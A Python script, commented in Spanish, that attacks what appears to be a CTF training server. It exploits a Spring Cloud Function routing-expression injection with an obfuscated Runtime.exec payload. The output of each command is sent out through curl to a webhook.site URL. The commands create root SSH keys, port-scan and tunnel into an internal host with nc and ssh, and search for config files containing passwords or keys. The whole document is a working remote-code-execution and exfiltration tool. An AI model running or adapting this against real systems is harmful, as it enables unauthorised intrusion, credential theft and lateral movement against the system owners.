#!/usr/bin/env python3
"""
CTF Chile - Generación de claves SSH y exploración alternativa
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Generando claves SSH...")

# Crear directorio .ssh y generar claves
probe("setup_ssh", "mkdir -p /root/.ssh && chmod 700 /root/.ssh")
probe("gen_ssh_key", "ssh-keygen -t rsa -b 2048 -f /root/.ssh/id_rsa -N '' -C 'ctf@omni' >/dev/null 2>&1 && echo 'SSH_KEY_GENERATED'")
probe("show_pubkey", "cat /root/.ssh/id_rsa.pub 2>/dev/null")

print("[*] Explorando otros protocolos en 10.160.209.1...")

# Escaneo de puertos más completo
probe("port_scan_advanced", "for port in 21 22 23 25 53 79 80 110 111 135 139 143 443 445 993 995 1723 3389 5432 5984 6379 8080 8443 9200; do timeout 1 nc -z 10.160.209.1 $port && echo 'OPEN: '$port || echo 'CLOSED: '$port; done | grep OPEN")

print("[*] Probando protocolos específicos...")

# FTP
probe("ftp_test", "timeout 5 echo 'quit' | nc 10.160.209.1 21 | head -2")

# HTTP con diferentes métodos
probe("http_methods", "timeout 3 echo -e 'OPTIONS / HTTP/1.1\\r\\nHost: 10.160.209.1\\r\\n\\r\\n' | nc 10.160.209.1 80 | head -10")

# Base de datos
probe("db_check", "timeout 3 echo 'test' | nc 10.160.209.1 5432 | head -2 2>/dev/null || echo 'NO_DB'")

print("[*] Buscando archivos de configuración específicos...")

# Buscar archivos relacionados con la segunda máquina
probe("search_hosts", "find /app /root /tmp -type f -exec grep -l '10.160.209.1' {} \\; 2>/dev/null")
probe("search_config", "find /app /root -name '*.json' -o -name '*.yaml' -o -name '*.config' | xargs grep -l 'ssh\\|key\\|password' 2>/dev/null")

print("[*] Explorando métodos de túnel...")

# Probar si podemos establecer un túnel
probe("tunnel_test", "timeout 5 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -L 8888:localhost:80 root@10.160.209.1 'echo tunnel' 2>&1 || echo 'TUNNEL_FAILED'")

print("[*] Buscando flags en el sistema de archivos actual...")

# Buscar flags que podrían estar ocultos
probe("flag_search_deep", "find / -type f -name '*flag*' 2>/dev/null | head -10")
probe("flag_search_content", "find /app /root /tmp -type f -exec grep -l 'ctfchile{' {} \\; 2>/dev/null")
probe("hidden_files", "find /root -name '.*' -type f 2>/dev/null | head -10")

time.sleep(15)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=25", timeout=10)
data = r.json().get("data", [])

open_ports = []
flags_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar puertos abiertos
            if "OPEN:" in decoded:
                ports = [line.split(": ")[1] for line in decoded.split("\n") if "OPEN:" in line]
                open_ports.extend(ports)
                print(f"🔓 PUERTOS ABIERTOS: {', '.join(ports)}")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append(decoded)
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

            # Detectar claves SSH
            if "ssh-rsa" in decoded or "BEGIN" in decoded:
                print("🔐 Clave SSH detectada")

        except Exception as e:
            print(f"(decode error) {raw[:150]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")

if open_ports:
    print(f"\n🔍 PUERTOS ABIERTOS ENCONTRADOS: {set(open_ports)}")
if flags_found:
    print(f"🎉 FLAGS ENCONTRADOS: {len(flags_found)}")
    for flag in flags_found:
        print(f"  {flag}")